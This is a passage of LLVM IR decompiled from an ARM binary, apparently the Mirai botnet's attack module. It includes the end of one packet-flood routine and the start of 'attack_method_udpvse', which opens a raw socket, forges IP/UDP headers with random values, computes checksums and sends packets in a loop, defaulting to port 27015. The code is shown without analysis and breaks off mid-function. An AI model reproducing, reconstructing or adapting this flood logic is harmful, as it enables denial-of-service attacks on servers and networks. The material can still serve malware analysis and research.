.thread16:                                        ; preds = %dec_label_pc_9e98
  %v1_9ea0 = load i32, i32* @r5, align 4
  %v2_9ea0 = add i32 %v1_9ea0, 16
  %v3_9ea0 = inttoptr i32 %v2_9ea0 to i32*
  %v4_9ea0 = load i32, i32* %v3_9ea0, align 4
  store i32 %v4_9ea0, i32* %r3.global-to-local, align 4
  %v2_9ea4 = load i32, i32* @r6, align 4
  %v3_9ea4 = add i32 %v2_9ea4, 16
  %v4_9ea4 = inttoptr i32 %v3_9ea4 to i32*
  store i32 %v4_9ea0, i32* %v4_9ea4, align 4
  br label %dec_label_pc_9eac

dec_label_pc_9eac:                                ; preds = %bb85, %.thread16
  store i32 %v1_9b74, i32* %r1.global-to-local, align 4
  store i1 %v2_a03c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a03c, label %dec_label_pc_9eb8, label %dec_label_pc_a048

dec_label_pc_9eb8:                                ; preds = %dec_label_pc_9eac, %dec_label_pc_a034, %dec_label_pc_a048
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9ebc = load i32, i32* @r5, align 4
  %v3_9ebc = add i32 %v2_9ebc, 10
  %v4_9ebc = inttoptr i32 %v3_9ebc to i16*
  store i16 0, i16* %v4_9ebc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9ec4 = load i32, i32* @r5, align 4
  store i32 %v0_9ec4, i32* @r0, align 4
  %v2_9ec8 = call i32 @checksum_generic(i32 %v0_9ec4, i32 20)
  %v3_9ec8 = trunc i32 %v2_9ec8 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9ed0 = load i32, i32* @r5, align 4
  %v4_9ed0 = add i32 %v3_9ed0, 10
  %v5_9ed0 = inttoptr i32 %v4_9ed0 to i16*
  store i16 %v3_9ec8, i16* %v5_9ed0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9ed8 = trunc i32 %v0_9ed8 to i16
  %v2_9ed8 = load i32, i32* @r6, align 4
  %v3_9ed8 = add i32 %v2_9ed8, 10
  %v4_9ed8 = inttoptr i32 %v3_9ed8 to i16*
  store i16 %v1_9ed8, i16* %v4_9ed8, align 2
  %v0_9edc = load i32, i32* @r6, align 4
  store i32 %v0_9edc, i32* @r0, align 4
  %v2_9ee0 = call i32 @checksum_generic(i32 %v0_9edc, i32 20)
  %v3_9ee0 = trunc i32 %v2_9ee0 to i16
  %v3_9ee4 = load i32, i32* @r6, align 4
  %v4_9ee4 = add i32 %v3_9ee4, 10
  %v5_9ee4 = inttoptr i32 %v4_9ee4 to i16*
  store i16 %v3_9ee0, i16* %v5_9ee4, align 2
  store i32 0, i32* @r4, align 4
  %v0_9eec = load i32, i32* @r7, align 4
  store i32 %v0_9eec, i32* @r1, align 4
  %v1_9ef0 = add i32 %v0_9eec, 4
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i16*
  %v3_9ef0 = load i16, i16* %v2_9ef0, align 2
  %v4_9ef0 = zext i16 %v3_9ef0 to i32
  store i32 %v4_9ef0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_9ef8 = add i32 %v0_9eec, 6
  %v4_9ef8 = inttoptr i32 %v3_9ef8 to i16*
  store i16 0, i16* %v4_9ef8, align 2
  %v0_9efc = load i32, i32* @r6, align 4
  %v4_9f00 = call i32 @checksum_tcpudp(i32 %v0_9efc, i32 %v0_9eec, i32 %v4_9ef0, i32 %stack_var_-124.0.ph)
  %v5_9f00 = trunc i32 %v4_9f00 to i16
  %v3_9f04 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f04, i32* %r2.global-to-local, align 4
  %v3_9f08 = mul i32 %v3_9f04, 32
  store i32 %v3_9f08, i32* %r3.global-to-local, align 4
  %v0_9f0c = load i32, i32* @r5, align 4
  %v1_9f0c = add i32 %v0_9f0c, 16
  %v2_9f0c = inttoptr i32 %v1_9f0c to i32*
  %v3_9f0c = load i32, i32* %v2_9f0c, align 4
  %v5_9f10 = mul i32 %v3_9f04, 24
  store i32 %v5_9f10, i32* %r3.global-to-local, align 4
  %v1_9f14 = load i32, i32* @sb, align 4
  %v2_9f14 = add i32 %v1_9f14, %v5_9f10
  store i32 %v2_9f14, i32* @lr, align 4
  %v2_9f18 = add i32 %v2_9f14, 4
  %v3_9f18 = inttoptr i32 %v2_9f18 to i32*
  store i32 %v3_9f0c, i32* %v3_9f18, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9f20 = load i32, i32* @r7, align 4
  %v4_9f20 = add i32 %v3_9f20, 6
  %v5_9f20 = inttoptr i32 %v4_9f20 to i16*
  store i16 %v5_9f00, i16* %v5_9f20, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9f28 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f28 = trunc i32 %v0_9f28 to i16
  %v2_9f28 = load i32, i32* %r3.global-to-local, align 4
  %v3_9f28 = load i32, i32* @sb, align 4
  %v4_9f28 = add i32 %v3_9f28, %v2_9f28
  %v5_9f28 = inttoptr i32 %v4_9f28 to i16*
  store i16 %v1_9f28, i16* %v5_9f28, align 2
  %v0_9f2c = load i32, i32* @r4, align 4
  %v1_9f2c = trunc i32 %v0_9f2c to i16
  %v2_9f2c = load i32, i32* @lr, align 4
  %v3_9f2c = add i32 %v2_9f2c, 2
  %v4_9f2c = inttoptr i32 %v3_9f2c to i16*
  store i16 %v1_9f2c, i16* %v4_9f2c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9f34 = load i32, i32* @r5, align 4
  store i32 %v0_9f34, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r8, align 4
  store i32 %v0_9f3c, i32* %r2.global-to-local, align 4
  %v0_9f40 = load i32, i32* @lr, align 4
  %v0_9f44 = load i32, i32* %ip.global-to-local, align 4
  %v6_9f48 = call i32 @__libc_sendto(i32 %v3_9bbc, i32 %v0_9f34, i32 %v0_9f3c, i32 16384, i32 %v0_9f40, i32 %v0_9f44)
  %v3_9f4c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f4c, i32* %r3.global-to-local, align 4
  %v1_9f50 = add i32 %v3_9f4c, 1
  %v1_9f54 = load i32, i32* @sl, align 4
  %v9_9f54 = icmp eq i32 %v1_9f50, %v1_9f54
  store i1 %v9_9f54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9f50, i32* %stack_var_-44, align 4
  %v6_9f5c = icmp slt i32 %v1_9f50, %v1_9f54
  br i1 %v6_9f5c, label %dec_label_pc_9e3c, label %dec_label_pc_9e28

dec_label_pc_9f64:                                ; preds = %dec_label_pc_9e3c
  %v1_9f64 = add i32 %v2_9e44, 16
  %v2_9f64 = inttoptr i32 %v1_9f64 to i32*
  %v3_9f64 = load i32, i32* %v2_9f64, align 4
  store i32 %v3_9f64, i32* %r4.global-to-local, align 4
  %v0_9f68 = call i32 @rand_next()
  %v3_9f6c = load i32, i32* %stack_var_-44, align 4
  %v5_9f74 = mul i32 %v3_9f6c, 24
  %v0_9f78 = load i32, i32* %r4.global-to-local, align 4
  %v1_9f78 = and i32 %v0_9f78, 16711680
  store i32 %v1_9f78, i32* %ip.global-to-local, align 4
  %v3_9f7c = udiv i32 %v0_9f78, 16777216
  %v4_9f80 = udiv i32 %v1_9f78, 256
  %v5_9f80 = or i32 %v4_9f80, %v3_9f7c
  store i32 %v5_9f80, i32* %r2.global-to-local, align 4
  %v1_9f84 = load i32, i32* @sb, align 4
  %v2_9f84 = add i32 %v1_9f84, %v5_9f74
  store i32 %v2_9f84, i32* %r1.global-to-local, align 4
  %v1_9f88 = and i32 %v0_9f78, 65280
  store i32 %v1_9f88, i32* %r3.global-to-local, align 4
  %v1_9f8c = add i32 %v2_9f84, 20
  %v2_9f8c = inttoptr i32 %v1_9f8c to i8*
  %v3_9f8c = load i8, i8* %v2_9f8c, align 1
  %v4_9f8c = zext i8 %v3_9f8c to i32
  store i32 %v4_9f8c, i32* %ip.global-to-local, align 4
  %v5_9f94 = call i32 @llvm.bswap.i32(i32 %v0_9f78)
  %v7_9f98 = lshr i32 %v0_9f68, %v4_9f8c
  %v8_9f98 = add i32 %v7_9f98, %v5_9f94
  store i32 %v8_9f98, i32* %r2.global-to-local, align 4
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
  %v5_9fb4 = call i32 @llvm.bswap.i32(i32 %v8_9f98)
  store i32 %v5_9fb4, i32* %r3.global-to-local, align 4
  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  %v1_9fbc = load i32, i32* @r5, align 4
  %v2_9fbc = add i32 %v1_9fbc, 16
  %v3_9fbc = inttoptr i32 %v2_9fbc to i32*
  store i32 %v5_9fb4, i32* %v3_9fbc, align 4
  br i1 %v2_9e68, label %dec_label_pc_9fc4, label %dec_label_pc_9e70

dec_label_pc_9fc4:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9e64
  %v0_9fc4 = call i32 @rand_next()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9fd0 = load i32, i32* @fp, align 4
  %v9_9fd0 = icmp eq i32 %v0_9fd0, 65535
  store i1 %v9_9fd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9fd4 = load i32, i32* @r5, align 4
  %v2_9fd4 = add i32 %v1_9fd4, 12
  %v3_9fd4 = inttoptr i32 %v2_9fd4 to i32*
  store i32 %v0_9fc4, i32* %v3_9fd4, align 4
  br i1 %v9_9fd0, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge

dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge:    ; preds = %dec_label_pc_9fc4
  %v1_9e84.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9e70
  %v0_9fdc = call i32 @rand_next()
  %v3_9fe4 = urem i32 %v0_9fdc, 65536
  store i32 %v3_9c08, i32* %r2.global-to-local, align 4
  %v1_9ff0 = sub nsw i32 999, %v3_9fe4
  store i32 %v1_9ff0, i32* %r3.global-to-local, align 4
  %v1_9ff4 = load i32, i32* %r4.global-to-local, align 4
  %v9_9ff4 = icmp eq i32 %v3_9c08, %v1_9ff4
  store i1 %v9_9ff4, i1* %cpsr_z.global-to-local, align 1
  %v1_9ff8 = trunc i32 %v0_9fdc to i16
  %v2_9ff8 = load i32, i32* @r5, align 4
  %v3_9ff8 = add i32 %v2_9ff8, 4
  %v4_9ff8 = inttoptr i32 %v3_9ff8 to i16*
  store i16 %v1_9ff8, i16* %v4_9ff8, align 2
  %v0_9ffc = load i32, i32* %r3.global-to-local, align 4
  %v1_9ffc = trunc i32 %v0_9ffc to i16
  %v2_9ffc = load i32, i32* @r6, align 4
  %v3_9ffc = add i32 %v2_9ffc, 4
  %v4_9ffc = inttoptr i32 %v3_9ffc to i16*
  store i16 %v1_9ffc, i16* %v4_9ffc, align 2
  br i1 %v9_9ff4, label %dec_label_pc_a004, label %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge

dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge:    ; preds = %dec_label_pc_9fdc
  %v1_9e90.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e8c

dec_label_pc_a004:                                ; preds = %dec_label_pc_9fdc, %dec_label_pc_9e80
  %v0_a004 = call i32 @rand_next()
  %v1_a004 = trunc i32 %v0_a004 to i16
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %v1_a00c = load i32, i32* %r4.global-to-local, align 4
  %v9_a00c = icmp eq i32 %v3_9c0c, %v1_a00c
  store i1 %v9_a00c, i1* %cpsr_z.global-to-local, align 1
  %v3_a010 = load i32, i32* @r5, align 4
  %v4_a010 = add i32 %v3_a010, 44
  %v5_a010 = inttoptr i32 %v4_a010 to i16*
  store i16 %v1_a004, i16* %v5_a010, align 2
  br i1 %v9_a00c, label %dec_label_pc_a018, label %dec_label_pc_9e98

dec_label_pc_a018:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9e8c
  %v0_a018 = call i32 @rand_next()
  %v1_a018 = trunc i32 %v0_a018 to i16
  store i32 %v1_9c00, i32* @r4, align 4
  store i1 %v2_a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a020, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_a018
  %v3_a02831 = load i32, i32* @r7, align 4
  %v4_a02832 = add i32 %v3_a02831, 2
  %v5_a02833 = inttoptr i32 %v4_a02832 to i16*
  store i16 %v1_a018, i16* %v5_a02833, align 2
  br label %dec_label_pc_a034

bb85:                                             ; preds = %dec_label_pc_a018
  %v1_a024 = load i32, i32* @r5, align 4
  %v2_a024 = add i32 %v1_a024, 16
  %v3_a024 = inttoptr i32 %v2_a024 to i32*
  %v4_a024 = load i32, i32* %v3_a024, align 4
  store i32 %v4_a024, i32* %r3.global-to-local, align 4
  %v3_a028 = load i32, i32* @r7, align 4
  %v4_a028 = add i32 %v3_a028, 2
  %v5_a028 = inttoptr i32 %v4_a028 to i16*
  store i16 %v1_a018, i16* %v5_a028, align 2
  %v1_a02c = load i32, i32* %r3.global-to-local, align 4
  %v2_a02c = load i32, i32* @r6, align 4
  %v3_a02c = add i32 %v2_a02c, 16
  %v4_a02c = inttoptr i32 %v3_a02c to i32*
  store i32 %v1_a02c, i32* %v4_a02c, align 4
  br label %dec_label_pc_9eac

dec_label_pc_a034:                                ; preds = %.thread30, %dec_label_pc_9e98
  %v0_a034 = call i32 @rand_next()
  store i32 %v1_9b74, i32* %r1.global-to-local, align 4
  store i1 %v2_a03c, i1* %cpsr_z.global-to-local, align 1
  %v1_a040 = load i32, i32* @r6, align 4
  %v2_a040 = add i32 %v1_a040, 16
  %v3_a040 = inttoptr i32 %v2_a040 to i32*
  store i32 %v0_a034, i32* %v3_a040, align 4
  br i1 %v2_a03c, label %dec_label_pc_9eb8, label %dec_label_pc_a048

dec_label_pc_a048:                                ; preds = %dec_label_pc_9eac, %dec_label_pc_a034
  %v0_a048 = load i32, i32* @r7, align 4
  %v1_a048 = add i32 %v0_a048, 8
  store i32 %v5_9b54, i32* %r1.global-to-local, align 4
  %v2_a050 = inttoptr i32 %v1_a048 to i16*
  %v3_a050 = call i32 @rand_str(i16* %v2_a050, i32 %v5_9b54)
  br label %dec_label_pc_9eb8

dec_label_pc_a058:                                ; preds = %dec_label_pc_9bcc
  %v1_a05c = call i32 @__GI___libc_close(i32 %v3_9bbc)
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %entry, %dec_label_pc_a058
  %v1_a068 = phi i32 [ %v3_9bbc, %entry ], [ %v1_a05c, %dec_label_pc_a058 ]
  store i32 %v3_9a6c, i32* %r4.global-to-local, align 4
  store i32 %v6_9a6c, i32* %r5.global-to-local, align 4
  store i32 %v24_9a6c, i32* %fp.global-to-local, align 4
  ret i32 %v1_a068

dec_label_pc_a06c:                                ; preds = %dec_label_pc_9bf4
  store i32 %v5_9b54, i32* %r2.global-to-local, align 4
  %v1_a074 = add i32 %v5_9b54, 8
  store i32 %v1_a074, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9e28.preheader

; uselistorder directives
  uselistorder i32 %v1_a074, { 1, 0 }
  uselistorder i16 %v1_a018, { 1, 0 }
  uselistorder i32 %v0_9fdc, { 1, 0 }
  uselistorder i32 %v5_9fb4, { 1, 0 }
  uselistorder i32 %v0_9f78, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9f54, { 1, 2, 0 }
  uselistorder i32 %v1_9f50, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9f04, { 1, 0, 2 }
  uselistorder i32 %v0_9eec, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9e50, { 1, 0, 2 }
  uselistorder i1 %v7_9e68, { 2, 1, 0 }
  uselistorder i1 %v2_a03c, { 2, 3, 1, 0 }
  uselistorder i1 %v2_a020, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9dc4, { 1, 0 }
  uselistorder i32 %v4_9d3813, { 1, 0 }
  uselistorder i32 %v3_9c5c, { 1, 0 }
  uselistorder i32 %v3_9c40, { 1, 2, 0 }
  uselistorder i32 %v1_9c3c, { 1, 0 }
  uselistorder i32 %v1_9c00, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9bfc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9bf8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9bf4, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9bec, { 1, 0 }
  uselistorder i1 %v7_9bc0, { 1, 0 }
  uselistorder i32 %v3_9bbc, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v5_9ba8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9b74, { 2, 1, 3, 0 }
  uselistorder i32 %v5_9b54, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_9b08, { 1, 0 }
  uselistorder i32 %v1_9ae4, { 2, 1, 0 }
  uselistorder i32 %v5_9adc, { 1, 0 }
  uselistorder i8 %v5_9ac0, { 0, 2, 1 }
  uselistorder i32 %v6_9aa0, { 1, 0 }
  uselistorder i32 %v2_9a88, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_a048, { 1, 0 }
  uselistorder label %dec_label_pc_9eb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9e28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9e28.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_method_udpvse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_a088 = load i32, i32* @r4, align 4
  %v27_a088 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a0a4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a0a8 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0a4, i32* @fp, align 4
  %v0_a0b8 = load i32, i32* @r4, align 4
  %v4_a0bc = inttoptr i32 %v0_a0a8 to i32*
  %v5_a0bc = call i32 @attack_get_opt_int(i32 %v0_a0b8, i32* %v4_a0bc, i32 2, i32 0)
  %v1_a0c8 = urem i32 %v5_a0bc, 256
  store i32 %v1_a0c8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a0d4 = load i32, i32* @r4, align 4
  %v0_a0d8 = load i32, i32* @r5, align 4
  %v5_a0dc = trunc i32 %v5_a0bc to i8
  %v6_a0e0 = inttoptr i32 %v0_a0d8 to i32*
  %v7_a0e0 = call i32 @attack_get_opt_int(i32 %v0_a0d4, i32* %v6_a0e0, i32 3, i32 65535)
  %v0_a0e4 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a0e0, i32* @r7, align 4
  %v0_a0f4 = load i32, i32* @r4, align 4
  %v4_a0f8 = inttoptr i32 %v0_a0e4 to i32*
  %v5_a0f8 = call i32 @attack_get_opt_int(i32 %v0_a0f4, i32* %v4_a0f8, i32 4, i32 64)
  %v1_a100 = urem i32 %v5_a0f8, 256
  store i32 %v1_a100, i32* %ip.global-to-local, align 4
  %v0_a104 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a110 = load i32, i32* @r4, align 4
  %v6_a118 = inttoptr i32 %v0_a104 to i32*
  %v7_a118 = call i32 @attack_get_opt_int(i32 %v0_a110, i32* %v6_a118, i32 5, i32 0)
  %v1_a124 = urem i32 %v7_a118, 256
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a130 = load i32, i32* @r4, align 4
  %v0_a134 = load i32, i32* @r5, align 4
  %v5_a13c = inttoptr i32 %v0_a134 to i32*
  %v6_a13c = call i32 @attack_get_opt_int(i32 %v0_a130, i32* %v5_a13c, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a14c = load i32, i32* @r5, align 4
  store i32 %v6_a13c, i32* @r6, align 4
  %v0_a154 = load i32, i32* @r4, align 4
  %v4_a158 = inttoptr i32 %v0_a14c to i32*
  %v5_a158 = call i32 @attack_get_opt_int(i32 %v0_a154, i32* %v4_a158, i32 7, i32 27015)
  store i32 %v5_a158, i32* @r4, align 4
  %v1_a164 = call i32 @table_unlock_val(i32 20)
  %v3_a170 = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_a184 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_a188 = icmp eq i32 %v3_a184, -1
  store i1 %v7_a188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a184, i32* @sb, align 4
  br i1 %v7_a188, label %dec_label_pc_a4b0, label %dec_label_pc_a194

dec_label_pc_a194:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a19c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a19c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a1b0 = call i32 @__GI_setsockopt(i32 %v3_a184, i32 0, i32 3, i32 %v6_a19c, i32 ptrtoint (i32* @0 to i32))
  %v7_a1b4 = icmp eq i32 %v5_a1b0, -1
  store i1 %v7_a1b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1b4, label %dec_label_pc_a4a8, label %dec_label_pc_a1bc

dec_label_pc_a1bc:                                ; preds = %dec_label_pc_a194
  %v0_a1bc = load i32, i32* @r4, align 4
  %v3_a1bc = mul i32 %v0_a1bc, 65536
  store i32 %v3_a1bc, i32* @lr, align 4
  %v0_a1c0 = load i32, i32* @r7, align 4
  %v0_a1c4 = load i32, i32* @r6, align 4
  %v3_a1c4 = mul i32 %v0_a1c4, 65536
  store i32 %v3_a1c4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_a1cc = urem i32 %v0_a1c0, 65536
  %v3_a1d0 = urem i32 %v0_a1c4, 65536
  store i32 %v3_a1d0, i32* %r2.global-to-local, align 4
  %v3_a1d4 = urem i32 %v0_a1bc, 65536
  store i32 %v3_a1d4, i32* %r3.global-to-local, align 4
  %v0_a1d8 = load i32, i32* @r8, align 4
  %v2_a1d8 = icmp eq i32 %v0_a1d8, 0
  store i1 %v2_a1d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a1d8, label %dec_label_pc_a314.preheader, label %dec_label_pc_a1f0

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a1bc
  %tmp34 = mul i32 %v0_a1c0, 256
  %v3_a200 = and i32 %tmp34, 65280
  store i32 %v3_a200, i32* %r3.global-to-local, align 4
  %tmp35 = mul i32 %v0_a1c4, 256
  %v3_a204 = and i32 %tmp35, 65280
  store i32 %v3_a204, i32* %r2.global-to-local, align 4
  %tmp36 = mul i32 %v0_a1bc, 256
  %v3_a208 = and i32 %tmp36, 65280
  %tmp37 = udiv i32 %v0_a1c0, 256
  %v4_a20c = urem i32 %tmp37, 256
  %v5_a20c = or i32 %v4_a20c, %v3_a200
  store i32 %v5_a20c, i32* @r5, align 4
  %tmp38 = udiv i32 %v0_a1c4, 256
  %v4_a210 = urem i32 %tmp38, 256
  %v5_a210 = or i32 %v4_a210, %v3_a204
  store i32 %v5_a210, i32* @r6, align 4
  %tmp39 = udiv i32 %v0_a1bc, 256
  %v4_a214 = urem i32 %tmp39, 256
  %v5_a214 = or i32 %v4_a214, %v3_a208
  store i32 %v5_a214, i32* @r7, align 4
  %v1_a29c = trunc i32 %v5_a0f8 to i8
  br label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %.thread, %dec_label_pc_a1f0
  %v2_a220 = call i32 @calloc(i32 128, i32 1)
  %v3_a224 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a224, i32* %r2.global-to-local, align 4
  %v5_a22c = mul i32 %v3_a224, 24
  store i32 %v5_a22c, i32* %r3.global-to-local, align 4
  %v1_a230 = load i32, i32* @fp, align 4
  %v2_a230 = load i32, i32* @r4, align 4
  %v5_a230 = mul i32 %v2_a230, 4
  %v6_a230 = add i32 %v5_a230, %v1_a230
  %v7_a230 = inttoptr i32 %v6_a230 to i32*
  store i32 %v2_a220, i32* %v7_a230, align 4
  %v0_a234 = load i32, i32* %r3.global-to-local, align 4
  %v1_a234 = load i32, i32* @sl, align 4
  %v2_a234 = add i32 %v1_a234, %v0_a234
  store i32 %v2_a234, i32* %r3.global-to-local, align 4
  %v0_a238 = load i32, i32* @fp, align 4
  %v1_a238 = load i32, i32* %r2.global-to-local, align 4
  %v4_a238 = mul i32 %v1_a238, 4
  %v5_a238 = add i32 %v4_a238, %v0_a238
  %v6_a238 = inttoptr i32 %v5_a238 to i32*
  %v7_a238 = load i32, i32* %v6_a238, align 4
  store i32 %v7_a238, i32* @lr, align 4
  %v1_a240 = inttoptr i32 %v7_a238 to i8*
  %v2_a240 = load i8, i8* %v1_a240, align 1
  %tmp = urem i8 %v2_a240, 16
  %v1_a244 = zext i8 %tmp to i32
  %v1_a248 = or i32 %v1_a244, 64
  store i32 %v1_a248, i32* %r3.global-to-local, align 4
  %v1_a250 = trunc i32 %v1_a248 to i8
  store i8 %v1_a250, i8* %v1_a240, align 1
  %v0_a254 = load i32, i32* @lr, align 4
  %v1_a254 = inttoptr i32 %v0_a254 to i8*
  %v2_a254 = load i8, i8* %v1_a254, align 1
  %v1_a258 = and i8 %v2_a254, -16
  %v1_a25c = or i8 %v1_a258, 5
  store i8 %v1_a25c, i8* %v1_a254, align 1
  %v2_a268 = load i32, i32* @lr, align 4
  %v3_a268 = add i32 %v2_a268, 1
  %v4_a268 = inttoptr i32 %v3_a268 to i8*
  store i8 %v5_a0dc, i8* %v4_a268, align 1
  %v3_a26c = load i32, i32* %stack_var_-48, align 4
  %v3_a270 = mul i32 %v3_a26c, 65536
  %v1_a274 = add i32 %v3_a270, 2097152
  %v3_a278 = udiv i32 %v1_a274, 256
  %v4_a280 = udiv i32 %v1_a274, 16777216
  %v5_a280 = or i32 %v3_a278, %v4_a280
  %v3_a284 = urem i32 %v3_a26c, 65536
  store i32 %v3_a284, i32* %r2.global-to-local, align 4
  %v1_a288 = trunc i32 %v5_a280 to i16
  %v2_a288 = load i32, i32* @lr, align 4
  %v3_a288 = add i32 %v2_a288, 2
  %v4_a288 = inttoptr i32 %v3_a288 to i16*
  store i16 %v1_a288, i16* %v4_a288, align 2
  %v0_a28c = load i32, i32* %r2.global-to-local, align 4
  %v1_a28c = mul i32 %v0_a28c, 65536
  %v3_a294 = add i32 %v1_a28c, 786432
  store i32 %v3_a294, i32* %r2.global-to-local, align 4
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
  %v2_a29c = load i32, i32* @lr, align 4
  %v3_a29c = add i32 %v2_a29c, 8
  %v4_a29c = inttoptr i32 %v3_a29c to i8*
  store i8 %v1_a29c, i8* %v4_a29c, align 1
  %v0_a2a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_a2a0 = udiv i32 %v0_a2a0, 256
